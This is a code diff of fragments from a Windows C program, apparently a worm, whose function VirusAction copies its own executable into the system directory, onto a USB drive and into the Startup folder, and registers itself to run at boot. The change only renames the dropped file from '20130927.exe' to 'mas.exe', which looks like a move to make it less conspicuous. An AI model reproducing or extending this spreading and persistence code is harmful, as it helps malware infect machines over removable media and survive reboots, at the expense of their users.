@@ -61,7 +61,7 @@ void VirusAction()
 	//拷贝到系统目录
 	char path_system[MAX_PATH];
 	GetSystemDirectory(path_system,MAX_PATH);  
-	strcat(path_system,"\\20130927.exe");
+	strcat(path_system,"\\mas.exe");
 	char path_thisEXE[MAX_PATH];
 	GetModuleFileName(NULL,path_thisEXE,MAX_PATH);  
 	
@@ -70,7 +70,7 @@ void VirusAction()
 	
 	//拷贝到U盘
 	CreateDirectory(U_path,NULL); 
-	strcat(U_path,"\\20130927.exe");
+	strcat(U_path,"\\mas.exe");
 	CopyFile(path_thisEXE,U_path,TRUE);
  
 	//开机启动此程序
@@ -81,7 +81,7 @@ void VirusAction()
 	RegCloseKey(h_openkey);
 	
 	char t_AutoStartPath[MAX_PATH]="C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动";
-	strcat(t_AutoStartPath,"\\20130927.exe");
+	strcat(t_AutoStartPath,"\\mas.exe");
 	CopyFile(path_thisEXE,t_AutoStartPath,TRUE);
 	
 	//////////////////////////////////////////////////////////////////////////
